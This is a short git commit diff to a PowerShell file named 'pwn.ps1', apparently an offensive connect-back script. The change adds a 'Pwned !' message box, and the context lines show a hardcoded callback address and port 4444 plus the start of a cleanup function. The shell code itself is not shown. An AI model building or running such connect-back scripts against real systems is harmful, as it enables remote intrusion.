d30ad5266acf02d95d7b5e79b3b2d37d128fa78f
Toufik Airane <toufik.airane@gmail.com>
2015-11-02 13:05:30 +0100

    Update pwn.ps1

--- ps1/pwn.ps1
+++ ps1/pwn.ps1
@@ -1,3 +1,5 @@
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+[System.Windows.Forms.MessageBox]::Show("Pwned ! @tfairane : take a look at my GitHub Vectors.")
 $address = '172.19.36.230'
 $port = '4444'
 function cleanup {
